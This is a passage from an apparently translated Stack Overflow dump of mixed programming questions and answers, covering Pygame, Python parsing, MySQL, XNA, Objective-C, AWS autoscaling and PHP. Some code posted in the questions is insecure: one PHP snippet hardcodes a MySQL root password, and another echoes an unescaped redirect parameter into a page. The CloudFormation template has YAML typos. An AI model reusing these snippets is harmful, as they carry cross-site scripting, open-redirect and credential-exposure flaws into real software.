indexPath.row

0: subject
1: receiver,sender
2: webview for content
3: first attachement
4: second attachement
5: ... further attachements 
```

所以你可以声明不同`UITableViewCell`的子类

```
subject
adresses
webviewcell
attachment 
```

而且您知道对于每个`row > 2`（或左右）您都必须返回一个附件单元

只是一个想法，可能是我解决它的第一个想法

# python - Mac os x 10.7.3 上的 Pygame 问题

> ID：10069394
> 
> 赞同：1
> 
> 时间：2012-04-09T05:42:01.287
> 
> 标签：python, macos, image, pygame

所以，我从 mac Lion 中的 python 开始，我正在尝试用图像制作我的第一个程序：这是程序的代码

```
import pygame, sys
from pygame.locals import *

pygame.init()

FPS = 30
fpsClock = pygame.time.Clock()

DISPLAYSURF = pygame.display.set_mode((400, 300), 0, 32)
pygame.display.set_caption('Animation');

WHITE = (255, 255, 255)
catImg = pygame.image.load("cat.png")
catx = 10
caty = 10
direction = 'right'

while True:
    DISPLAYSURF.fill(WHITE)

    if direction == 'right':
        catx += 5
        if catx == 280:
            direction = 'down'
    elif direction == 'down':
        caty += 5
        if caty == 220:
            direction = 'left'
    elif direction == 'left':
        catx -= 5
        if catx == 10:
            direction = 'up'
    elif direction == 'up':
        caty -= 5
        if caty == 10:
            direction = 'right'

    DISPLAYSURF.blit(catImg, (catx, caty))

    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit()

    pygame.display.update()
    fpsClock.tick(FPS) 
```

程序运行时出现错误：

```
Traceback (most recent call last):
  File "catanimation.py", line 13, in <module>
    catImg = pygame.image.load("cat.png")
pygame.error: File is not a Windows BMP file 
```

这个问题的原因可能是什么

信息：我使用表面而不是图像，效果很好。我怀疑这个问题可能与我的 pygame 安装有关，但我不确定

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:37:25.347

您的代码实际上在 Python 2.6 (Mac OS X 10.6) 上对我来说是“开箱即用”的。

如果您使用的是随您的操作系统（Apple 2.7）提供的 Python 版本，请确保您使用的是这个包：[Pygame for Apple 提供的 Python - Mac OS X 10.7](http://www.pygame.org/ftp/pygame-1.9.2pre-py2.7-macosx10.7.mpkg.zip)。

# python - 将文本文件的行拆分为元组 Python 的一部分

> ID：10069396
> 
> 赞同：1
> 
> 时间：2012-04-09T05:42:31.863
> 
> 标签：python, split, tuples

我正在开发一个汇编程序并选择使用 Python 而不是 C（主要是因为 Python 可以处理列表，我想学习它）

我的问题是如何将文本文件的每一行拆分为元组的一部分？

例如测试文件是：

```
ADD R1,R2;  
OR R1,R3; 
```

并有代码将其解析为

```
UserProgram=[['ADD','R1','R2'],['OR','R1','R3']] 
```

它还必须忽略分号后的注释。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:05:05.593

```
>>> s = "ADD R1,R2; OR R1,R3;"
>>> t1 = s.split(';')
>>> t1
['ADD R1,R2', ' OR R1,R3', '']
>>> UserProgram = [t.strip().replace(',', ' ').split(' ') for t in t1 if len(t) > 0]
>>> UserProgram
[['ADD', 'R1', 'R2'], ['OR', 'R1', 'R3']]
>>> 
```

顺便说一句，方括号表示列表，而不是元组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T00:00:37.907

所以我们有一个这种格式的源文件。

我们想要文件中每一行的标记列表。

标记是在第一个分号之后切断所有内容并将其余部分拆分为逗号或空格的结果。我们可以通过用空格替换逗号来做到这一点，然后只用空格分割。

所以我们转向标准库。`split`当您不给字符串拆分时，字符串的方法会在空格上拆分。该`replace`方法允许我们用另一个子字符串替换一个子字符串（例如，`','`用`' '`）。要删除分号后的所有内容，我们可以`partition`将其取出并取第一部分（结果的元素 0）。* 因此，对单个行的处理看起来像

```
line.partition(';')[0].replace(',', ' ').split() 
```

然后我们只需对文件的每一行执行此操作。要获得将某些函数应用于源元素的结果列表，我们可以使用列表推导直接请求它（基本上我们描述了结果列表应该是什么样子）。Python 中的文件对象是行的有效来源；您可以对其进行迭代（这个概念可能对 C++ 程序员来说更熟悉）并且元素是文件的行。

所以我们需要做的就是打开文件（我们习惯性地使用`with`块来管理文件）并生成列表：

```
with open('asm.s') as source:
    parsed = [
        line.partition(';')[0].replace(',', ' ').split()
        for line in source
    ] 
```

完毕。

* 或`split`再次使用，但是当生成元素列表实际上不是您的目标时，我发现这不太清楚。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T06:09:09.817

```
>>> import re
>>> [re.split('\W+', s.strip()) for s in 'ADD R1,R2; OR R1,R3;'.split(';') if s]
[['ADD', 'R1', 'R2'], ['OR', 'R1', 'R3']] 
```

**升级版：**

```
python -m timeit -s "import re; regexp = re.compile('\W+');" "[regexp.split(s.strip()) for s in 'ADD R1,R2; OR R1,R3;'.split(';') if s]"
100000 loops, best of 3: 3.34 usec per loop

python -m timeit "[t.strip().replace(',', ' ').split(' ') for t in 'ADD R1,R2; OR R1,R3;'.split(';') if t]"100000 loops, best of 3: 2.1 usec per loop 
```

顺便说一句，我的变种还不错，虽然有点慢

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T06:16:18.890

如果您的来源是这种格式

```
source="""
ADD R1,R2;
OR R1,R3;
""" 
```

然后您可以简单地通过 splitlines() 线性拆分源，然后使用`;`分隔符再次拆分，丢弃 ';' 之后的任何内容

```
sourcelines=[x.split(";")[0].replace(',',' ').split() 
             for x in source.splitlines() if x]
[['ADD', 'R1', 'R2'], ['OR', 'R1', 'R3']] 
```

您还可以继续前进并将每个 ASM 源代码行拆分为 OP-Code 和单独的操作数。

```
[[token.split(',') for token in x.split(";")[0].split()] 
  for x in source.splitlines() if x] 
```

你会得到类似的东西

```
[[['ADD'], ['R1', 'R2']], [['OR'], ['R1', 'R3']]] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T06:55:22.767

```
>>>s = "ADD R1,R2; OR R1,R3;"
>>>[substr.split() for substr in s.replace(',',' ').split(';')[:-1]]
[['ADD', 'R1', 'R2'], ['OR', 'R1', 'R3']] 
```

# mysql - 您可以在 SELECT 中分配一个变量，然后在同一个 SELECT 中使用它吗？

> ID：10069398
> 
> 赞同：0
> 
> 时间：2012-04-09T05:42:42.257
> 
> 标签：mysql, alias

这是我正在尝试编写的查询：

```
SELECT I.*, 
       IF(MAX(B.`amount`) != 0, MAX(B.`amount`), I.`start`) AS `current_bid`, 
       `current_bid` * 1.05 AS `min_bid`
       ... 
```

我收到错误“未知列'current_bid'”。我假设这是因为我刚刚在之前的行中创建了当前列。无论如何我可以让这个查询按我想要的方式工作吗？我想让它工作的一种方法是使用两个 if 语句，它们说的基本相同，如下所示：

```
SELECT I.*, 
       IF(MAX(B.`amount`) != 0, MAX(B.`amount`), I.`start`) AS `current_bid`, 
       IF(MAX(B.`amount`) != 0, MAX(B.`amount`) * 1.05, I.`start` * 1.05) AS `min_id`
       ... 
```

但这似乎非常低效。

`current`另外，有没有一种方法可以在不计算`MAX(B.amount)`两次的情况下分配？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:48:38.180

```
SELECT
    C.CURRENT_BID,
    C.CURRENT_BID * 1.05 AS MIN_BID
FROM
    (
        SELECT MAX(B.AMOUNT) AS CURRENT_BID FROM ...
    ) C 
```

我很确定嵌套查询会首先执行，以便您可以使用它们的结果。而同一查询中的不同列被视为并发，因此您不能使它们相互依赖。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:51:12.793

您不能引用`current_bid`另一列中的任何别名列。有两种方法可以继续：

1.  每当您想使用该值时，您都可以复制整个计算（最有效，可读性较差）
2.  您使用派生表（效率较低，可读性更高）

在后一种情况下，您应该执行以下操作：

```
select current_bid from (
    IF(MAX(B.`amount`) != 0, MAX(B.`amount`), I.`start`) AS `current_bid`...
) s 
```

我想强调派生表将对所有行执行扫描，这样效率会降低。大多数时候最好复制公式。

PS：如果你选择第一个选项，请注意你可以`IF`这样写你的第二个：

```
IF(MAX(B.`amount`) = 0, I.`start`, MAX(B.`amount`)) * 1.05 `min_id` 
```

这更具可读性。

# c# - Visual Studio XNA 4.0 Refresh - 创建新项目和打开现有项目时出现问题

> ID：10069399
> 
> 赞同：2
> 
> 时间：2012-04-09T05:42:54.673
> 
> 标签：c#, visual-studio, visual-studio-2010, xna, xna-4.0

我正在尝试在 Visual Studio 2010 Ultimate 中创建一个新的 XNA 4.0 Refresh C# 项目。我之前安装了 XNA 4.0，但我参加的课程需要 4.0 Refresh。每当我尝试在 VS2010 中创建项目时，都会收到以下错误消息：

> 错误：此模板试图加载组件程序集“Microsoft.Xna.GameStudio，版本=4.0.0.0，Culture=neutral，PublicKeyToken=6d5c3888ef60e27d”。有关此问题以及如何启用此模板的详细信息，请参阅有关自定义项目模板的文档。

我已经研究了这个问题一段时间，这是我尝试过但没有成功的建议

*   使用 /setup 标志启动 VS2010
*   重置导入/导出设置
*   完全卸载 VS2010 和 XNA 4.0 Refresh（两次），第二次使用 MSDN 中的卸载实用程序

在可能相关的注释中，如果我尝试打开在不同系统上创建的 XNA 项目，我会收到以下错误：

> 无法打开“C:\Users\...\Game.contentproj”，因为此版本的应用程序不支持其项目类型 (.contentproj)。

这是日志输出的要点： [https ://gist.github.com/2341704](https://gist.github.com/2341704)

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-09T08:50:59.093

Windows 8 开发不再支持 XNA。我强烈建议您更改为[Monogame](http://monogame.net)。它是 XNA 的开源端口。它也适用于新的 Visual Studio。

就您的具体问题而言。在旧项目中，内容管理是 XNA 项目的一部分。但后来他们改变了那部分并将内容移出项目。只是为了在不同项目之间进行内容共享。特别是当您为 Zune、Windows Phone 和 XBOX 进行开发时。这给打开项目带来了问题。

最简单的升级方法是创建新项目并移动所有代码。据我所知，代码部分没有或几乎没有变化。而且变化也处于非常高的水平，通常不会被开发人员广泛用于游戏中。您的内容将包含在项目中的新内容项目中。如果您创建新游戏，它只会这样。

如上所述，您也可以转移到 Monogame。您的代码仍将保持不变。而对于像带有 OpenGL 选项的 windows 游戏这样的少数项目，您甚至不需要将内容移动到另一个项目。

如果需要任何进一步的细节，请告诉我。

PS：根据上次更新，XNA 官方并没有被微软领先，新的 XBOX 的支持还没有宣布。但是使用 Monogame，您可以使用您的 XNA 知识定位多个平台。

# objective-c - iOS - 在变量中存储对对象的引用

> ID：10069402
> 
> 赞同：0
> 
> 时间：2012-04-09T05:43:06.423
> 
> 标签：objective-c, ios

我将如何在变量中引用 UILabel ？

例如;

```
NSObject *instance;
switch (option) {
    case 0: 
    {
        NSObject *instance = self.player1;
    }
    case 1:
    {
        NSObject *instance = self.player2;
    }
}
instance.text = @"Hello" 
```

然后我想更改 NSObject 中标签的文本，但这似乎不起作用。那么我该怎么做呢？

顺便说一句，如果你不知道的话，我是 Objective C 的新手。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:48:26.353

```
NSObject *instance;
switch (option) {
    case 0: 
        instance = self.player1;  // Don't redeclare the variable, just set it.
        break;   // If we don't do this, we'll continue on to the next line!

    case 1:
        instance = self.player2;
        break;

    default:
        // If option isn't 0 or 1, we should try to handle it.
        instance = nil;
        break;
} 
```

我强烈建议您阅读一些 Objective-C 和/或 C 教程——如果您在语法基础方面遇到问题，您会发现很难取得很大进展。Stack Overflow 并不是学习这类东西的最佳方式。

# amazon-ec2 - 根据请求计数使用云形成自动扩展

> ID：10069407
> 
> 赞同：8
> 
> 时间：2012-04-09T05:43:59.850
> 
> 标签：amazon-ec2, amazon-web-services, amazon-cloudformation, amazon-cloudwatch

我们根据负载均衡器 RequestCount 指标使用云形成进行自动缩放。目前，如果请求增加到 1500 1 分钟，我们会扩展一个实例（每个实例每分钟可以处理 1500 个请求）。问题是，因为自动缩放组不断检查 RequestCount 并在请求计数大于 1500 1 分钟时添加一个新实例。但这不是必需的，因为我现在有 2 个可以处理 3000 个请求的实例。每分钟。是否有任何工具可以定制矩阵？即，如果添加新实例，则扩展策略将更改为 3000 req。

示例场景：

1.  最初有 1 个 ELB，1 个连接到 ELB 的 tomcat 实例（每分钟可以处理 1500 个请求）。
2.  1 个云手表，如果需要，可以采取扩大策略的行动。ELB 的计数增加到 1500 分钟。
3.  当前，ELB 上的请求负载为 1500，持续 1 分钟。现在要求。负载增加到 1700 分钟。因此它将在 ELB 上附加一个新的 tomcat 实例。所以我有 2 个实例可以处理 3000 个请求。分钟。
4.  但是现在云手表有什么问题仍然检查req。依靠 ELB，如果需要。最小负载为 1700。它将添加一个不需要的新 tomcat 实例。

我怎样才能摆脱这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T14:43:48.930

您要做的是使用负载均衡器的平均值。您可以有不同类型的指标。总和、平均值、最小值、最大值和样本。如果您选择平均，它将为您提供负载均衡器下所有实例的平均值。因此，只有当您组中的所有服务器都达到每分钟 1500 个请求时，它才会触发新的实例启动。

类型的快速描述：

*   平均值 - 负载均衡器的平均值
*   Sum - 请求的总数（例如：3000）
*   最大值 - 任何服务器的最大请求数（因为它可能不完全平衡）
*   最小值 - 任何服务器的最小请求数（因为它可能不完全平衡）
*   示例 - 用于计算平均值的服务器数量（基本上是负载均衡器上有多少台服务器）

您也可以创建自己的自定义指标，但您需要创建一个应用程序来告诉亚马逊这些值是什么。使用 cloud watch api，您可以轻松创建自己的。看看这里[http://docs.amazonwebservices.com/AmazonCloudWatch/latest/DeveloperGuide/Welcome.html?r=1540](http://docs.amazonwebservices.com/AmazonCloudWatch/latest/DeveloperGuide/Welcome.html?r=1540)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-19T13:19:47.267

正如 dsummersl 所说，RequestCount[不能](http://docs.aws.amazon.com/elasticloadbalancing/latest/classic/elb-cloudwatch-metrics.html)直接与平均指标一起使用。

[我在这里](https://forums.aws.amazon.com/thread.jspa?threadID=86073)找到了一些解决方法。基本上，它们会告诉您定义一个自定义 CloudWatch 指标，以便您可以检测您的实例以发出它们正在接收的请求数量。

为此，您需要收集来自每个实例的请求计数并使用[put-metric-data](http://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/publishingMetrics.html)将其发送到 cloudwatch ，或者创建一个[ebextension](http://docs.aws.amazon.com/elasticbeanstalk/latest/dg/health-enhanced-cloudwatch.html)以便 EBS 为您完成（我认为这是最简单的方法）。

然后，您可以根据该自定义指标将 Auto Scaling 设置为向上/向下扩展。

希望能帮助到你。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-03-30T09:49:27.937

我通过将[扩展策略](http://docs.aws.amazon.com/autoscaling/latest/userguide/policy_creating.html#policy-creating-asg-console)与触发策略评估的关联[Cloudwatch 警报](http://docs.aws.amazon.com/autoscaling/latest/userguide/policy_creating.html#policy-creating-alarms-aws-cli)`RequestCount`一起应用扩展策略，从而根据工作进行扩展。下面是我在 ElasticBeanstalk 应用程序中使用的 cloudformation 模板：

```
 RequestCountScalingAlarmLt2000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when Request Count < 2000"
       AlarmName: {"Fn::Join": ["-", ["Scale when Request Count < 2000", { "Ref":"AWSEBEnvironmentName" }]]}
       ComparisonOperator: LessThanThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 2000
   RequestCountScalingAlarmGt2000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 2000 < Request Count < 20000"
       AlarmName: "Scale when Request 2000 < Count < 20000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 2000
   RequestCountScalingAlarmGt20000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 20000 < Request Count < 30000"
       AlarmName: "Scale when 20000 < Request Count < 30000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 20000
   RequestCountScalingAlarmGt30000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 30000 < Request Count < 40000"
       AlarmName: "Scale when 30000 < Request Count < 40000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 30000
   RequestCountScalingAlarmGt40000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions::
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 40000 < Request Count < 50000"
       AlarmName: "Scale when 40000 < Request Count < 50000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 40000
   RequestCountScalingAlarmGt50000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 50000 < Request Count < 60000"
       AlarmName: "Scale when 50000 < Request Count < 60000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 50000
   RequestCountScalingAlarmGt60000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions::
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when 60000 < Request Count < 70000"
       AlarmName: "Scale when 60000 < Request Count < 70000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 60000
   RequestCountScalingAlarmGt70000:
     Type: "AWS::CloudWatch::Alarm"
     Properties:
       ActionsEnabled: true
       AlarmActions:
         - Ref: RequestCountScalingPolicy
       OKActions:
         - Ref: RequestCountScalingPolicy
       AlarmDescription: "Scale when Request Count >= 70000"
       AlarmName: "Scale when Request Count >= 70000"
       ComparisonOperator: GreaterThanOrEqualToThreshold
       Dimensions:
         - Name: LoadBalancerName
           Value:
             Ref: AWSEBLoadBalancer
       EvaluationPeriods: "1"
       MetricName: RequestCount
       Namespace: AWS/ELB
       Period: "300"
       Statistic: Sum
       Threshold: 70000
   RequestCountScalingPolicy:
     Type: "AWS::AutoScaling::ScalingPolicy"
     Properties:
       AutoScalingGroupName:
         Ref: "AWSEBAutoScalingGroup"
       AdjustmentType: "ExactCapacity"
       PolicyType: "StepScaling"
       EstimatedInstanceWarmup: 120
       StepAdjustments:
         -
           MetricIntervalLowerBound: "0"
           MetricIntervalUpperBound: "2000"
           ScalingAdjustment: "1"
         -
           MetricIntervalLowerBound: "2000"
           MetricIntervalUpperBound: "20000"
           ScalingAdjustment: "2"
         -
           MetricIntervalLowerBound: "20000"
           MetricIntervalUpperBound: "30000"
           ScalingAdjustment: "3"
         -
           MetricIntervalLowerBound: "30000"
           MetricIntervalUpperBound: "40000"
           ScalingAdjustment: "4"
         -
           MetricIntervalLowerBound: "40000"
           MetricIntervalUpperBound: "50000"
           ScalingAdjustment: "5"
         -
           MetricIntervalLowerBound: "50000"
           MetricIntervalUpperBound: "60000"
           ScalingAdjustment: "6"
         -
           MetricIntervalLowerBound: "60000"
           MetricIntervalUpperBound: "70000"
           ScalingAdjustment: "7"
         -
           MetricIntervalLowerBound: "70000"
           ScalingAdjustment: "8" 
```

# java - 通过从数据库中获取数据在 Java Web 应用程序中发送短信

> ID：10069413
> 
> 赞同：0
> 
> 时间：2012-04-09T05:45:02.503
> 
> 标签：java, oracle, sms, sms-gateway

我想`SMS application`通过java web ie在jsp、servlet和sms应用程序所需的其他东西中进行开发。

我的要求是：在我的`database(oracle)`两列即`student_name and student_score`存在。如果有人想知道他的分数，那么他会发短信`STUDENT hisname to a number (let's say 1234)`，然后在收到此短信后，我的 java 短信应用程序将通过从数据库中获取分数来发送他的分数。

我需要关于如何开发它的建议或想法？从哪里可以得到一个数字`1234`？

用户将`sms`：

```
 STUDENT suresh to 1234 
```

在我的数据库中，suresh 的分数是`80`这样的`user will get score 80 in his mobile`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:53:16.213

我想电话号码需要确认并存储在您的数据库中。您可以使用[短信网关](http://en.wikipedia.org/wiki/List_of_SMS_gateways.)提供商发送短信。

# php - 我的输出 [menu1,menu2,menu3] 数组列表存储在数据库中我想在 php 中删除 [,]

> ID：10069417
> 
> 赞同：0
> 
> 时间：2012-04-09T05:45:26.277
> 
> 标签：php

我可以通过 url 将 arraylist android 发送到 php。该arraylist也可以存储在数据库中。但它包括[在开始]结束。我想先拆刹车

```
 here my code is given

         <?php
         $arr=explode(',',preg_replace('/^.*\[(.*)\].*$/','$1',$_POST['menuname']));
         mysql_connect("localhost","root","mobixmysql");
         mysql_select_db("test");
         foreach($arr as $value){
         mysql_query("INSERT INTO test (menuname) VALUES ('" . 
         mysql_real_escape_string($value) . "')")or
         die('unable'.mysql_error());
         echo "inserted";
         }
         ?> 
```

我的数据库在mysql数据库中存储[menu1在menuname列的第一行，menu2最后在第二列]如何首先和最后删除brakets ..请告诉我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:09:27.270

```
trim($string, '[]'); 
```

其中 $string = [menu1, menu2, menu3....]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:13:40.417

```
 <?php
     $arr=explode(',',preg_replace('/^.*\[(.*)\].*$/','$1',trim($_POST['menuname'], '[]')));
     mysql_connect("localhost","root","mobixmysql");
     mysql_select_db("test");
     foreach($arr as $value){
     mysql_query("INSERT INTO test (menuname) VALUES ('" . 
     mysql_real_escape_string($value) . "')")or
     die('unable'.mysql_error());
     echo "inserted";
     }
     ?> 
```

# algorithm - Fuzzy k-means - 没有关联，下一次迭代的质心如何计算？

> ID：10069418
> 
> 赞同：1
> 
> 时间：2012-04-09T05:45:35.623
> 
> 标签：algorithm, k-means, fuzzy

根据`Mahout in Action`

> 与 k-means 一样，模糊 k-means 在数据集上循环，但不是将向量分配给最近的质心，而是计算点与每个聚类的关联程度。

如果没有将向量分配给最近的质心，那么在下一次迭代中如何计算质心？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:56:53.453

我刚刚搜索了模糊 k-means，它听起来基本上就像 EM 聚类，这是一个广为人知且有用的概念。

这里的问题是没有硬性分配。

当一个点选择它应该属于哪个质心时，它会得出它属于每个质心的概率（通过考虑它与每个质心的距离并通过它们的累积和对这些数字进行归一化）

当质心决定重新定位到哪里时，它没有明确定义的一组点属于它，它可以简单地为其新位置取平均值。相反，它所做的是根据它们属于它的概率对这些点进行加权平均。因此，如果只有 3 个点 X、Y 和 Z，并且 X 和 Y 分别以 1.0 的概率属于该集群，Z 以 0.5 的概率属于该集群，那么质心的新位置将是

> (1.0/2.5) * X + (1.0/2.5) * Y + (0.5/2.5) * Z

所以这就是在每次迭代中计算质心的方式。

# c++ - 什么是纯C++

> ID：10069419
> 
> 赞同：1
> 
> 时间：2012-04-09T05:45:43.530
> 
> 标签：c++

纯 C++ 是什么意思？请解释 C++ 的不同版本，如 Visual C++ 和 GNU C++。

这些类型的 C++ 的编译器怎么样？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T05:48:24.173

纯 C++ 意味着根据 ISO 标准的 C++，没有使用任何供应商特定的扩展。

这意味着它应该可以在支持该标准的*所有*实现中移植。否则，您可能会发现自己被锁定在特定的供应商中，这*不一定*是件坏事，但您应该了解该决定的含义。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T05:48:54.493

纯 C++ 是 C++ 的一种形式，它仅使用 ISO C++ 标准定义的语义。
纯 C++ 中实现的代码在所有标准编译 C++ 编译器中是完全可移植的。

允许实现对 C++ 标准提供的功能提供自己的扩展。每个编译器都以编译器扩展的形式提供。

因此，

> 纯 C++ = 标准 C++ 提供的功能
> Visual C++ = 标准 C++ + MSVC 编译器扩展提供的功能。
> GNU C++ = 标准 C++ + GNU 编译器扩展提供的功能。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T05:49:20.910

没有“纯 C++”之类的东西。要么是 C++，要么不是。有一些公司已经对 C++ 进行了扩展，它们有像“WinMain”这样的新关键字，它们不是 C++ 标准的一部分。也许这就是你所指的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T06:32:11.490

[Stanley Lipman 在http://msdn.microsoft.com/en-us/magazine/cc163852.aspx](http://msdn.microsoft.com/en-us/magazine/cc163852.aspx)描述了微软为他们的 C++/CLI 混合发明的术语：

> C++/CLI 代表了 Kansas 和 Oz 的原生和托管编程的集成。在这个迭代中，这是通过一种独立但平等的源级和二进制元素社区完成的，包括混合模式（本机和 CTS 类型的源级混合，加上本机和 CIL 目标文件的二进制混合），纯模式（本机和 CTS 类型的源级混合，全部编译为 CIL 对象文件）、本机类（只能通过特殊的包装类保存 CTS 类型）和 CTS 类（只能将本机类型作为指针保存）。

因此，**Microsoft 世界中的“纯”C++ 是专有功能和 ISO 标准 C++ 功能的特定组合的术语**。

斯坦利的描述将其与“原生”区分开来 - 这与该问题的其他现有答案描述为“纯”相匹配。在这个词的一般英语用法中，“纯”当然是“原生”= ISO 标准。从表面上看，微软选择了一个明显具有误导性的术语，这样人们可能会在不知不觉中将自己和他们的代码锁定为使用专有的微软扩展，因此在以后尝试将它们移植到其他操作系统时会感到沮丧.

> 术语 C++，如 Visual C++ 和 GNU C++。这些类型的 C++ 的编译器怎么样。

Visual C++ 是 Microsoft 的 C++ 和 C++/CLI 编译器的品牌名称。GNU 是一个生产无数开源软件产品的组织，其中包括 GCC - GNU 编译器集合，其中包括一个 C++ 编译器。

# php - PHP注册后将post数据转发到登录页面

> ID：10069426
> 
> 赞同：1
> 
> 时间：2012-04-09T05:46:44.327
> 
> 标签：php, post, redirect, file-get-contents

我正在尝试使用注册页面中生成的用户名和密码哈希将数据发布到登录页面。我有这个工作，但我一生无法弄清楚它为什么停止了。

基本上，如果注册成功，代码将重定向用户以自动登录。但是，该代码也用于管理面板，因此可以添加用户并返回到用户管理屏幕。

```
 if (isset($_GET['redirect'])){
        if (isset($_GET['login'])){
            if($_GET['login'] == "true"){
                    // So we can log users automatically after registering
                $post = http_build_query(
                    array(
                        "username" => $username,
                        "password" => $password
                    )
                );
                $context = stream_context_create(
                    array(
                        "http"=>array(
                            "method" => "POST",
                            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
                            "content" => $post
                        )
                    )
                );
                // testing shows that the code gets this far...
                // but does not send the following... instead it skips this

                $page = file_get_contents('http://example.com/login.php?redirect='.$_GET['redirect'], false, $context);
            }
        }
        header('Location: ' . $_GET['redirect']);

        echo('<p><a href="'.$_GET['redirect'] . '">Back to where you were...</a></p>');

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:05:15.350

我认为您必须只提供密码，而不是其哈希码。

或者（如果此时无法访问普通密码）您可以扩展登录脚本。它必须支持一些其他条件来登录用户 - 不需要明文密码的条件 - 例如，它可以采用密码的哈希值。或者将标记用户已登录的代码放在单独的可访问位置，并在注册后执行，而无需转到原始登录页面。

# java - 打开代码建议下拉菜单时 Eclipse 没有响应

> ID：10069430
> 
> 赞同：0
> 
> 时间：2012-04-09T05:47:29.130
> 
> 标签：java, eclipse, ide

我正在使用 eclipse IDE 进行项目开发，每当代码建议下拉菜单打开我的 IDE 时就会停止响应并需要很长时间才能恢复。

以下是我的 Eclipse IDE 详细信息：

版本：Helios Service Release 1 Build id：20100917-0705

每当我按“。” 在类或数据结构出现此问题后（eclipse 试图显示代码建议并将其挂起）。

请让我知道可以做些什么来避免这种情况。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:59:56.620

这可能有很多原因，例如，

1) 由于系统配置低。

2）由于许多其他程序的运行，这正在减慢 Eclipse。

3) 由于使用了许多 API 或 JAR 并存在多个相同的命名类。

4) 正在使用旧版本的 eclipse。

它很久以前就发生在我身上。您可以禁用或更改内容辅助的设置（窗口/首选项/Java/编辑器/内容辅助/取消选中自动激活）。

使用 Eclipse V 3.7 尝试相同的操作。

# c# - 电子邮件文本挖掘

> ID：10069431
> 
> 赞同：0
> 
